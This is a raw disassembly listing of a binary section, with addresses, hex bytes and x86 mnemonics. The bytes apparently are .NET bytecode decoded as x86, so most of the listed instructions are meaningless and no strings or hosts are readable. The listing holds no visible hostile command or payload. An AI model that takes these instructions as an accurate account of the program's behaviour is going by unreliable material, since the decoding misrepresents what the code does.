  404c01:	00 00                	add    %al,(%eax)
  404c03:	00 02                	add    %al,(%edx)
  404c05:	00 1f                	add    %bl,(%edi)
  404c07:	00 6a 89             	add    %ch,-0x77(%edx)
  404c0a:	00 0a                	add    %cl,(%edx)
	...
  404c14:	93                   	xchg   %eax,%ebx
  404c15:	93                   	xchg   %eax,%ebx
  404c16:	00 0a                	add    %cl,(%edx)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	00 01                	add    %al,(%ecx)
  404c1c:	13 30                	adc    (%eax),%esi
  404c1e:	02 00                	add    (%eax),%al
  404c20:	2f                   	das
  404c21:	00 00                	add    %al,(%eax)
  404c23:	00 22                	add    %ah,(%edx)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	11 28                	adc    %ebp,(%eax)
  404c29:	da 00                	fiaddl (%eax)
  404c2b:	00 0a                	add    %cl,(%edx)
  404c2d:	0a 16                	or     (%esi),%dl
  404c2f:	0b 2b                	or     (%ebx),%ebp
  404c31:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404c36:	08 6f db             	or     %ch,-0x25(%edi)
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 02                	or     (%edx),%al
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	dc 00                	faddl  (%eax)
  404c40:	00 0a                	add    %cl,(%edx)
  404c42:	28 dd                	sub    %bl,%ch
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404c49:	08 2a                	or     %ch,(%edx)
  404c4b:	07                   	pop    %es
  404c4c:	17                   	pop    %ss
  404c4d:	58                   	pop    %eax
  404c4e:	0b 07                	or     (%edi),%eax
  404c50:	06                   	push   %es
  404c51:	8e 69 32             	mov    0x32(%ecx),%gs
  404c54:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404c57:	00 1b                	add    %bl,(%ebx)
  404c59:	30 01                	xor    %al,(%ecx)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 20                	add    %ah,(%eax)
  404c65:	03 00                	add    (%eax),%eax
  404c67:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404c6d:	06                   	push   %es
  404c6e:	26 de 03             	fiadds %es:(%ebx)
  404c71:	26 de 00             	fiadds %es:(%eax)
  404c74:	2a 00                	sub    (%eax),%al
  404c76:	00 00                	add    %al,(%eax)
  404c78:	01 10                	add    %edx,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	00 00                	add    %al,(%eax)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0d 0d 00 03 01       	or     $0x103000d,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	01 13                	add    %edx,(%ebx)
  404c89:	30 03                	xor    %al,(%ebx)
  404c8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 11                	add    %dl,(%ecx)
  404c94:	16                   	push   %ss
  404c95:	7e 08                	jle    0x404c9f
  404c97:	00 00                	add    %al,(%eax)
  404c99:	04 12                	add    $0x12,%al
  404c9b:	00 73 de             	add    %dh,-0x22(%ebx)
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  404ca6:	06                   	push   %es
  404ca7:	2a 1b                	sub    (%ebx),%bl
  404ca9:	30 03                	xor    %al,(%ebx)
  404cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	14 fe                	adc    $0xfe,%al
  404cb6:	06                   	push   %es
  404cb7:	89 00                	mov    %eax,(%eax)
  404cb9:	00 06                	add    %al,(%esi)
  404cbb:	73 e0                	jae    0x404c9d
  404cbd:	00 00                	add    %al,(%eax)
  404cbf:	0a 28                	or     (%eax),%ch
  404cc1:	e1 00                	loope  0x404cc3
  404cc3:	00 0a                	add    %cl,(%edx)
  404cc5:	28 e2                	sub    %ah,%dl
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	0a 17                	or     (%edi),%dl
  404ccb:	16                   	push   %ss
  404ccc:	16                   	push   %ss
  404ccd:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404cd4:	26 de 00             	fiadds %es:(%eax)
  404cd7:	2a 01                	sub    (%ecx),%al
  404cd9:	10 00                	adc    %al,(%eax)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 20                	add    %ah,(%eax)
  404ce1:	20 00                	and    %al,(%eax)
  404ce3:	03 01                	add    (%ecx),%eax
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	01 1b                	add    %ebx,(%ebx)
  404ce9:	30 03                	xor    %al,(%ebx)
  404ceb:	00 18                	add    %bl,(%eax)
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 16                	add    %dl,(%esi)
  404cf5:	16                   	push   %ss
  404cf6:	16                   	push   %ss
  404cf7:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404cfe:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404d05:	14 00                	adc    $0x0,%al
  404d07:	00 0a                	add    %cl,(%edx)
  404d09:	2b f4                	sub    %esp,%esi
  404d0b:	2a 01                	sub    (%ecx),%al
  404d0d:	10 00                	adc    %al,(%eax)
  404d0f:	00 00                	add    %al,(%eax)
  404d11:	00 00                	add    %al,(%eax)
  404d13:	00 0a                	add    %cl,(%edx)
  404d15:	0a 00                	or     (%eax),%al
  404d17:	0d 01 00 00 01       	or     $0x1000001,%eax
  404d1c:	1b 30                	sbb    (%eax),%esi
  404d1e:	04 00                	add    $0x0,%al
  404d20:	38 00                	cmp    %al,(%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	23 00                	and    (%eax),%eax
  404d26:	00 11                	add    %dl,(%ecx)
  404d28:	7e 99                	jle    0x404cc3
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	04 18                	add    $0x18,%al
  404d33:	6f                   	outsl  %ds:(%esi),(%dx)
  404d34:	e3 00                	jecxz  0x404d36
  404d36:	00 0a                	add    %cl,(%edx)
  404d38:	0a 06                	or     (%esi),%al
  404d3a:	02 03                	add    (%ebx),%al
  404d3c:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	0a 17                	or     (%edi),%dl
  404d43:	0b de                	or     %esi,%ebx
  404d45:	18 06                	sbb    %al,(%esi)
  404d47:	2c 06                	sub    $0x6,%al
  404d49:	06                   	push   %es
  404d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4b:	33 00                	xor    (%eax),%eax
  404d4d:	00 0a                	add    %cl,(%edx)
  404d4f:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d52:	00 00                	add    %al,(%eax)
  404d54:	0a 28                	or     (%eax),%ch
  404d56:	95                   	xchg   %eax,%ebp
  404d57:	00 00                	add    %al,(%eax)
  404d59:	06                   	push   %es
  404d5a:	de 00                	fiadds (%eax)
  404d5c:	16                   	push   %ss
  404d5d:	2a 07                	sub    (%edi),%al
  404d5f:	2a 01                	sub    (%ecx),%al
  404d61:	1c 00                	sbb    $0x0,%al
  404d63:	00 02                	add    %al,(%edx)
  404d65:	00 11                	add    %dl,(%ecx)
  404d67:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 00                	add    %al,(%eax)
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 28                	add    %ch,(%eax)
  404d75:	28 00                	sub    %al,(%eax)
  404d77:	0c 32                	or     $0x32,%al
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	01 1b                	add    %ebx,(%ebx)
  404d7d:	30 02                	xor    %al,(%edx)
  404d7f:	00 39                	add    %bh,(%ecx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d86:	00 11                	add    %dl,(%ecx)
  404d88:	7e 99                	jle    0x404d23
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d8f:	00 00                	add    %al,(%eax)
  404d91:	04 6f                	add    $0x6f,%al
  404d93:	e6 00                	out    %al,$0x0
  404d95:	00 0a                	add    %cl,(%edx)
  404d97:	0a 06                	or     (%esi),%al
  404d99:	02 6f e7             	add    -0x19(%edi),%ch
  404d9c:	00 00                	add    %al,(%eax)
  404d9e:	0a 74 39 00          	or     0x0(%ecx,%edi,1),%dh
  404da2:	00 01                	add    %al,(%ecx)
  404da4:	0b de                	or     %esi,%ebx
  404da6:	18 06                	sbb    %al,(%esi)
  404da8:	2c 06                	sub    $0x6,%al
  404daa:	06                   	push   %es
  404dab:	6f                   	outsl  %ds:(%esi),(%dx)
  404dac:	33 00                	xor    (%eax),%eax
  404dae:	00 0a                	add    %cl,(%edx)
  404db0:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db3:	00 00                	add    %al,(%eax)
  404db5:	0a 28                	or     (%eax),%ch
  404db7:	95                   	xchg   %eax,%ebp
  404db8:	00 00                	add    %al,(%eax)
  404dba:	06                   	push   %es
  404dbb:	de 00                	fiadds (%eax)
  404dbd:	14 2a                	adc    $0x2a,%al
  404dbf:	07                   	pop    %es
  404dc0:	2a 00                	sub    (%eax),%al
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404dc7:	00 02                	add    %al,(%edx)
  404dc9:	00 10                	add    %dl,(%eax)
  404dcb:	00 0f                	add    %cl,(%edi)
  404dcd:	1f                   	pop    %ds
  404dce:	00 0a                	add    %cl,(%edx)
	...
  404dd8:	29 29                	sub    %ebp,(%ecx)
  404dda:	00 0c 32             	add    %cl,(%edx,%esi,1)
  404ddd:	00 00                	add    %al,(%eax)
  404ddf:	01 1b                	add    %ebx,(%ebx)
  404de1:	30 02                	xor    %al,(%edx)
  404de3:	00 35 00 00 00 23    	add    %dh,0x23000000
  404de9:	00 00                	add    %al,(%eax)
  404deb:	11 7e 99             	adc    %edi,-0x67(%esi)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	0a 7e 3a             	or     0x3a(%esi),%bh
  404df3:	00 00                	add    %al,(%eax)
  404df5:	04 6f                	add    $0x6f,%al
  404df7:	e6 00                	out    %al,$0x0
  404df9:	00 0a                	add    %cl,(%edx)
  404dfb:	0a 06                	or     (%esi),%al
  404dfd:	02 6f e8             	add    -0x18(%edi),%ch
  404e00:	00 00                	add    %al,(%eax)
  404e02:	0a 17                	or     (%edi),%dl
  404e04:	0b de                	or     %esi,%ebx
  404e06:	18 06                	sbb    %al,(%esi)
  404e08:	2c 06                	sub    $0x6,%al
  404e0a:	06                   	push   %es
  404e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0c:	33 00                	xor    (%eax),%eax
  404e0e:	00 0a                	add    %cl,(%edx)
  404e10:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e13:	00 00                	add    %al,(%eax)
  404e15:	0a 28                	or     (%eax),%ch
  404e17:	95                   	xchg   %eax,%ebp
  404e18:	00 00                	add    %al,(%eax)
  404e1a:	06                   	push   %es
  404e1b:	de 00                	fiadds (%eax)
  404e1d:	16                   	push   %ss
  404e1e:	2a 07                	sub    (%edi),%al
  404e20:	2a 00                	sub    (%eax),%al
  404e22:	00 00                	add    %al,(%eax)
  404e24:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404e27:	00 02                	add    %al,(%edx)
  404e29:	00 10                	add    %dl,(%eax)
  404e2b:	00 0b                	add    %cl,(%ebx)
  404e2d:	1b 00                	sbb    (%eax),%eax
  404e2f:	0a 00                	or     (%eax),%al
  404e31:	00 00                	add    %al,(%eax)
  404e33:	00 00                	add    %al,(%eax)
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 25 25 00 0c 32    	add    %ah,0x320c0025
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	01 1b                	add    %ebx,(%ebx)
  404e41:	30 03                	xor    %al,(%ebx)
  404e43:	00 3a                	add    %bh,(%edx)
  404e45:	00 00                	add    %al,(%eax)
  404e47:	00 23                	add    %ah,(%ebx)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	11 7e 99             	adc    %edi,-0x67(%esi)
  404e4e:	00 00                	add    %al,(%eax)
  404e50:	0a 72 bd             	or     -0x43(%edx),%dh
  404e53:	20 00                	and    %al,(%eax)
  404e55:	70 17                	jo     0x404e6e
  404e57:	6f                   	outsl  %ds:(%esi),(%dx)
  404e58:	e9 00 00 0a 0a       	jmp    0xa4a4e5d
  404e5d:	06                   	push   %es
  404e5e:	7e 3a                	jle    0x404e9a
  404e60:	00 00                	add    %al,(%eax)
  404e62:	04 6f                	add    $0x6f,%al
  404e64:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404e6b:	18 06                	sbb    %al,(%esi)
  404e6d:	2c 06                	sub    $0x6,%al
  404e6f:	06                   	push   %es
  404e70:	6f                   	outsl  %ds:(%esi),(%dx)
  404e71:	33 00                	xor    (%eax),%eax
  404e73:	00 0a                	add    %cl,(%edx)
  404e75:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e78:	00 00                	add    %al,(%eax)
  404e7a:	0a 28                	or     (%eax),%ch
  404e7c:	95                   	xchg   %eax,%ebp
  404e7d:	00 00                	add    %al,(%eax)
  404e7f:	06                   	push   %es
  404e80:	de 00                	fiadds (%eax)
  404e82:	16                   	push   %ss
  404e83:	2a 07                	sub    (%edi),%al
  404e85:	2a 00                	sub    (%eax),%al
  404e87:	00 01                	add    %al,(%ecx)
  404e89:	1c 00                	sbb    $0x0,%al
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	00 11                	add    %dl,(%ecx)
  404e8f:	00 0f                	add    %cl,(%edi)
  404e91:	20 00                	and    %al,(%eax)
  404e93:	0a 00                	or     (%eax),%al
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 00                	add    %al,(%eax)
  404e9b:	00 2a                	add    %ch,(%edx)
  404e9d:	2a 00                	sub    (%eax),%al
  404e9f:	0c 32                	or     $0x32,%al
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	01 1b                	add    %ebx,(%ebx)
  404ea5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404ea8:	c4 01                	les    (%ecx),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	25 00 00 11 73       	and    $0x73110000,%eax
  404eb1:	62 00                	bound  %eax,(%eax)
  404eb3:	00 06                	add    %al,(%esi)
  404eb5:	0a 06                	or     (%esi),%al
  404eb7:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404ebb:	00 1b                	add    %bl,(%ebx)
  404ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebe:	54                   	push   %esp
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	06                   	push   %es
  404ec2:	06                   	push   %es
  404ec3:	72 d1                	jb     0x404e96
  404ec5:	20 00                	and    %al,(%eax)
  404ec7:	70 6f                	jo     0x404f38
  404ec9:	4d                   	dec    %ebp
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ece:	59                   	pop    %ecx
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	06                   	push   %es
  404ed2:	0b 07                	or     (%edi),%eax
  404ed4:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404edb:	67 26 00 70 28       	add    %dh,%es:0x28(%bx,%si)
  404ee0:	27                   	daa
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	0a 2d 22 07 72 71    	or     0x71720722,%ch
  404ee9:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404eed:	27                   	daa
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	0a 2d 56 07 72 7f    	or     0x7f720756,%ch
  404ef6:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404efa:	27                   	daa
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 3a                	or     (%edx),%bh
  404eff:	cb                   	lret
  404f00:	00 00                	add    %al,(%eax)
  404f02:	00 38                	add    %bh,(%eax)
  404f04:	5d                   	pop    %ebp
  404f05:	01 00                	add    %eax,(%eax)
  404f07:	00 28                	add    %ch,(%eax)
  404f09:	17                   	pop    %ss
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	06                   	push   %es
  404f0d:	0c 73                	or     $0x73,%al
  404f0f:	62 00                	bound  %eax,(%eax)
  404f11:	00 06                	add    %al,(%esi)
  404f13:	25 72 d1 20 00       	and    $0x20d172,%eax
  404f18:	70 6f                	jo     0x404f89
  404f1a:	4d                   	dec    %ebp
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	06                   	push   %es
  404f1e:	72 67                	jb     0x404f87
  404f20:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f24:	4f                   	dec    %edi
  404f25:	00 00                	add    %al,(%eax)
  404f27:	06                   	push   %es
  404f28:	25 72 e9 20 00       	and    $0x20e972,%eax
  404f2d:	70 6f                	jo     0x404f9e
  404f2f:	4d                   	dec    %ebp
  404f30:	00 00                	add    %al,(%eax)
  404f32:	06                   	push   %es
  404f33:	08 6a 6f             	or     %ch,0x6f(%edx)
  404f36:	42                   	inc    %edx
  404f37:	00 00                	add    %al,(%eax)
  404f39:	06                   	push   %es
  404f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3b:	57                   	push   %edi
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	06                   	push   %es
  404f3f:	28 1e                	sub    %bl,(%esi)
  404f41:	00 00                	add    %al,(%eax)
  404f43:	06                   	push   %es
  404f44:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404f47:	00 00                	add    %al,(%eax)
  404f49:	00 06                	add    %al,(%esi)
  404f4b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404f51:	10 01                	adc    %al,(%ecx)
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0d 06 72 95 26       	or     $0x26957206,%eax
  404f5a:	00 70 6f             	add    %dh,0x6f(%eax)
  404f5d:	4d                   	dec    %ebp
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	06                   	push   %es
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	59                   	pop    %ecx
  404f63:	00 00                	add    %al,(%eax)
  404f65:	06                   	push   %es
  404f66:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404f6c:	51                   	push   %ecx
  404f6d:	7e 3b                	jle    0x404faa
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	04 06                	add    $0x6,%al
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	5d                   	pop    %ebp
  404f75:	00 00                	add    %al,(%eax)
  404f77:	0a 73 62             	or     0x62(%ebx),%dh
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	06                   	push   %es
  404f7d:	25 72 d1 20 00       	and    $0x20d172,%eax
  404f82:	70 6f                	jo     0x404ff3
  404f84:	4d                   	dec    %ebp
  404f85:	00 00                	add    %al,(%eax)
  404f87:	06                   	push   %es
  404f88:	72 9d                	jb     0x404f27
  404f8a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f8e:	4f                   	dec    %edi
  404f8f:	00 00                	add    %al,(%eax)
  404f91:	06                   	push   %es
  404f92:	25 72 b3 26 00       	and    $0x26b372,%eax
  404f97:	70 6f                	jo     0x405008
  404f99:	4d                   	dec    %ebp
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	06                   	push   %es
  404f9d:	06                   	push   %es
  404f9e:	72 95                	jb     0x404f35
  404fa0:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fa4:	4d                   	dec    %ebp
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	06                   	push   %es
  404fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fa9:	59                   	pop    %ecx
  404faa:	00 00                	add    %al,(%eax)
  404fac:	06                   	push   %es
  404fad:	6f                   	outsl  %ds:(%esi),(%dx)
  404fae:	4f                   	dec    %edi
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	06                   	push   %es
  404fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb3:	57                   	push   %edi
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	06                   	push   %es
  404fb7:	28 1e                	sub    %bl,(%esi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	06                   	push   %es
  404fbc:	2b 0b                	sub    (%ebx),%ecx
  404fbe:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 28                	or     (%eax),%ch
  404fc5:	95                   	xchg   %eax,%ebp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	06                   	push   %es
  404fc9:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404fcf:	72 c1                	jb     0x404f92
  404fd1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fd5:	4d                   	dec    %ebp
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	06                   	push   %es
  404fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fda:	59                   	pop    %ecx
  404fdb:	00 00                	add    %al,(%eax)
  404fdd:	06                   	push   %es
  404fde:	06                   	push   %es
  404fdf:	72 95                	jb     0x404f76
  404fe1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fe5:	4d                   	dec    %ebp
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	06                   	push   %es
  404fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fea:	59                   	pop    %ecx
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404ff4:	7e 3b                	jle    0x405031
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 28                	add    $0x28,%al
  404ffa:	03 00                	add    (%eax),%eax
  404ffc:	00 2b                	add    %ch,(%ebx)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	5e                   	pop    %esi
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 13                	or     (%ebx),%dl
  405004:	04 2b                	add    $0x2b,%al
  405006:	45                   	inc    %ebp
  405007:	12 04 28             	adc    (%eax,%ebp,1),%al
  40500a:	5f                   	pop    %edi
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 11 05 72 95       	add    $0x95720511,%eax
  405014:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405018:	4d                   	dec    %ebp
  405019:	00 00                	add    %al,(%eax)
  40501b:	06                   	push   %es
  40501c:	6f                   	outsl  %ds:(%esi),(%dx)
  40501d:	59                   	pop    %ecx
  40501e:	00 00                	add    %al,(%eax)
  405020:	06                   	push   %es
  405021:	06                   	push   %es
  405022:	72 c1                	jb     0x404fe5
  405024:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 27                	sub    %ah,(%edi)
  405033:	00 00                	add    %al,(%eax)
  405035:	0a 2c 14             	or     (%esp,%edx,1),%ch
  405038:	11 05 28 93 00 00    	adc    %eax,0x9328
  40503e:	06                   	push   %es
  40503f:	7e 3b                	jle    0x40507c
  405041:	00 00                	add    %al,(%eax)
  405043:	04 11                	add    $0x11,%al
  405045:	05 6f ec 00 00       	add    $0xec6f,%eax
  40504a:	0a 26                	or     (%esi),%ah
  40504c:	12 04 28             	adc    (%eax,%ebp,1),%al
  40504f:	61                   	popa
  405050:	00 00                	add    %al,(%eax)
  405052:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  405058:	04 fe                	add    $0xfe,%al
  40505a:	16                   	push   %ss
  40505b:	02 00                	add    (%eax),%al
  40505d:	00 1b                	add    %bl,(%ebx)
  40505f:	6f                   	outsl  %ds:(%esi),(%dx)
  405060:	33 00                	xor    (%eax),%eax
  405062:	00 0a                	add    %cl,(%edx)
  405064:	dc de                	(bad)
  405066:	0c 6f                	or     $0x6f,%al
  405068:	e5 00                	in     $0x0,%eax
  40506a:	00 0a                	add    %cl,(%edx)
  40506c:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  405072:	00 2a                	add    %ch,(%edx)
  405074:	41                   	inc    %ecx
  405075:	4c                   	dec    %esp
  405076:	00 00                	add    %al,(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 00                	add    %al,(%eax)
  40507c:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  405083:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 32                	add    %dh,(%edx)
  40508d:	00 00                	add    %al,(%eax)
  40508f:	01 02                	add    %eax,(%edx)
  405091:	00 00                	add    %al,(%eax)
  405093:	00 55 01             	add    %dl,0x1(%ebp)
  405096:	00 00                	add    %al,(%eax)
  405098:	52                   	push   %edx
  405099:	00 00                	add    %al,(%eax)
  40509b:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  4050b5:	01 00                	add    %eax,(%eax)
  4050b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	32 00                	xor    (%eax),%al
  4050be:	00 01                	add    %al,(%ecx)
  4050c0:	13 30                	adc    (%eax),%esi
  4050c2:	0b 00                	or     (%eax),%eax
  4050c4:	1b 01                	sbb    (%ecx),%eax
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	26 00 00             	add    %al,%es:(%eax)
  4050cb:	11 28                	adc    %ebp,(%eax)
  4050cd:	ed                   	in     (%dx),%eax
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	0a 02                	or     (%edx),%al
  4050d2:	72 95                	jb     0x405069
  4050d4:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4050d8:	4d                   	dec    %ebp
  4050d9:	00 00                	add    %al,(%eax)
  4050db:	06                   	push   %es
  4050dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050dd:	59                   	pop    %ecx
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	06                   	push   %es
  4050e1:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  4050e7:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  4050ee:	00 0a                	add    %cl,(%edx)
  4050f0:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  4050f6:	ee                   	out    %al,(%dx)
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	0a 72 cb             	or     -0x35(%edx),%dh
  4050fc:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405100:	ef                   	out    %eax,(%dx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 28                	or     (%eax),%ch
  405105:	f0 00 00             	lock add %al,(%eax)
  405108:	0a 0a                	or     (%edx),%cl
  40510a:	7e 3c                	jle    0x405148
  40510c:	00 00                	add    %al,(%eax)
  40510e:	04 3a                	add    $0x3a,%al
  405110:	85 00                	test   %eax,(%eax)
  405112:	00 00                	add    %al,(%eax)
  405114:	20 00                	and    %al,(%eax)
  405116:	01 00                	add    %eax,(%eax)
  405118:	00 72 e7             	add    %dh,-0x19(%edx)
  40511b:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  40511f:	d0 16                	rclb   $1,(%esi)
  405121:	00 00                	add    %al,(%eax)
  405123:	02 28                	add    (%eax),%ch
  405125:	f1                   	int1
  405126:	00 00                	add    %al,(%eax)
  405128:	0a 1f                	or     (%edi),%bl
  40512a:	09 8d 86 00 00 01    	or     %ecx,0x1000086(%ebp)
  405130:	25 16 16 14 28       	and    $0x28141616,%eax
  405135:	f2 00 00             	repnz add %al,(%eax)
  405138:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40513e:	28 f2                	sub    %dh,%dl
  405140:	00 00                	add    %al,(%eax)
  405142:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405148:	28 f2                	sub    %dh,%dl
  40514a:	00 00                	add    %al,(%eax)
  40514c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  405152:	28 f2                	sub    %dh,%dl
  405154:	00 00                	add    %al,(%eax)
  405156:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40515c:	28 f2                	sub    %dh,%dl
  40515e:	00 00                	add    %al,(%eax)
  405160:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  405166:	28 f2                	sub    %dh,%dl
  405168:	00 00                	add    %al,(%eax)
  40516a:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
